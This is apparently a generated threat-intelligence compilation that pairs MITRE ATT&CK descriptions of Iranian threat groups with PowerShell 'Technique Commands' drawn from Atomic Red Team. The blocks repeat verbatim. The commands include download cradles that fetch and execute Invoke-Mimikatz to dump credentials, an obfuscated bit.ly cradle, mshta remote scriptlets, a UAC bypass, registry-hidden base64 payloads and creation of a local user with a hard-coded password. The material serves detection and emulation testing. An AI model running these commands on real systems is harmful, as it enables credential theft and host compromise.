$url='https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password ATOM1CR3DT3@M -Description '#{description}'
New-LocalUser -FullName '#{full_name}' -Name 'atomic_user' -Password ATOM1CR3DT3@M -Description '#{description}'
New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password #{password} -Description 'Atomic Things'
New-LocalUser -FullName 'Atomic Red Team' -Name '#{user_name}' -Password #{password} -Description 'Atomic Things'
powershell.exe IEX -exec bypass -windowstyle hidden -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -windowstyle hidden -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml');$Xml.command.a.execute | IEX"
"C:\Windows\system32\cmd.exe" /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct').Exec();close()"
# Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
powershell.exe -version 2 -Command Write-Host $PSVersion
Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
$streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'
Invoke-Expression $streamcommand
excel.exe
cmd.exe
powershell.exe
excel.exe
powershell.exe
mshta.exe
cmd.exe
powershell.exe
mshta.exe
powershell.exe
powerpoint.exe
cmd.exe
powershell.exe
powerpoint.exe
powershell.exe
powershell.exe webClient.DownloadString(
powershell.exe webClient.DownloadFile
powershell.exe webClient.DownloadData
winword.exe
powershell.exe
hidden|-enc|-NonI\\Windows\\.+\\WindowsPowerShell\\.+\\powershell.exe
powershell/lateral_movement/invoke_psremoting
powershell/lateral_movement/invoke_psremoting
powershell/management/spawn
powershell/management/spawn
python/management/multi/spawn
python/management/multi/spawn
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: PowerShell

## Technique Description

```
PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. 

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

Administrator permissions are required to use PowerShell to connect to remote systems.

A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)

PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)
```

## Technique Commands

```
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
$url='https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password ATOM1CR3DT3@M -Description '#{description}'
New-LocalUser -FullName '#{full_name}' -Name 'atomic_user' -Password ATOM1CR3DT3@M -Description '#{description}'
New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password #{password} -Description 'Atomic Things'
New-LocalUser -FullName 'Atomic Red Team' -Name '#{user_name}' -Password #{password} -Description 'Atomic Things'
powershell.exe IEX -exec bypass -windowstyle hidden -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -windowstyle hidden -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml');$Xml.command.a.execute | IEX"
"C:\Windows\system32\cmd.exe" /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct').Exec();close()"
# Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
powershell.exe -version 2 -Command Write-Host $PSVersion
Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
$streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'
Invoke-Expression $streamcommand
excel.exe
cmd.exe
powershell.exe
excel.exe
powershell.exe
mshta.exe
cmd.exe
powershell.exe
mshta.exe
powershell.exe
powerpoint.exe
cmd.exe
powershell.exe
powerpoint.exe
powershell.exe
powershell.exe webClient.DownloadString(
powershell.exe webClient.DownloadFile
powershell.exe webClient.DownloadData
winword.exe
powershell.exe
hidden|-enc|-NonI\\Windows\\.+\\WindowsPowerShell\\.+\\powershell.exe
powershell/lateral_movement/invoke_psremoting
powershell/lateral_movement/invoke_psremoting
powershell/management/spawn
powershell/management/spawn
python/management/multi/spawn
python/management/multi/spawn
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: PowerShell

## Technique Description

```
PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. 

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

Administrator permissions are required to use PowerShell to connect to remote systems.

A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)

PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)
```

## Technique Commands

```
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
$url='https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password ATOM1CR3DT3@M -Description '#{description}'
New-LocalUser -FullName '#{full_name}' -Name 'atomic_user' -Password ATOM1CR3DT3@M -Description '#{description}'
New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password #{password} -Description 'Atomic Things'
New-LocalUser -FullName 'Atomic Red Team' -Name '#{user_name}' -Password #{password} -Description 'Atomic Things'
powershell.exe IEX -exec bypass -windowstyle hidden -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -windowstyle hidden -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml');$Xml.command.a.execute | IEX"
"C:\Windows\system32\cmd.exe" /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct').Exec();close()"
# Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
powershell.exe -version 2 -Command Write-Host $PSVersion
Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
$streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'
Invoke-Expression $streamcommand
excel.exe
cmd.exe
powershell.exe
excel.exe
powershell.exe
mshta.exe
cmd.exe
powershell.exe
mshta.exe
powershell.exe
powerpoint.exe
cmd.exe
powershell.exe
powerpoint.exe
powershell.exe
powershell.exe webClient.DownloadString(
powershell.exe webClient.DownloadFile
powershell.exe webClient.DownloadData
winword.exe
powershell.exe
hidden|-enc|-NonI\\Windows\\.+\\WindowsPowerShell\\.+\\powershell.exe
powershell/lateral_movement/invoke_psremoting
powershell/lateral_movement/invoke_psremoting
powershell/management/spawn
powershell/management/spawn
python/management/multi/spawn
python/management/multi/spawn
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: PowerShell

## Technique Description

```
PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. 

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

Administrator permissions are required to use PowerShell to connect to remote systems.

A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)

PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)
```

## Technique Commands

```
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
$url='https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password ATOM1CR3DT3@M -Description '#{description}'
New-LocalUser -FullName '#{full_name}' -Name 'atomic_user' -Password ATOM1CR3DT3@M -Description '#{description}'
New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password #{password} -Description 'Atomic Things'
New-LocalUser -FullName 'Atomic Red Team' -Name '#{user_name}' -Password #{password} -Description 'Atomic Things'
powershell.exe IEX -exec bypass -windowstyle hidden -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -windowstyle hidden -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml');$Xml.command.a.execute | IEX"
"C:\Windows\system32\cmd.exe" /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct').Exec();close()"
# Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
powershell.exe -version 2 -Command Write-Host $PSVersion
Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
$streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'
Invoke-Expression $streamcommand
excel.exe
cmd.exe
powershell.exe
excel.exe
powershell.exe
mshta.exe
cmd.exe
powershell.exe
mshta.exe
powershell.exe
powerpoint.exe
cmd.exe
powershell.exe
powerpoint.exe
powershell.exe
powershell.exe webClient.DownloadString(
powershell.exe webClient.DownloadFile
powershell.exe webClient.DownloadData
winword.exe
powershell.exe
hidden|-enc|-NonI\\Windows\\.+\\WindowsPowerShell\\.+\\powershell.exe
powershell/lateral_movement/invoke_psremoting
powershell/lateral_movement/invoke_psremoting
powershell/management/spawn
powershell/management/spawn
python/management/multi/spawn
python/management/multi/spawn
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: PowerShell

## Technique Description

```
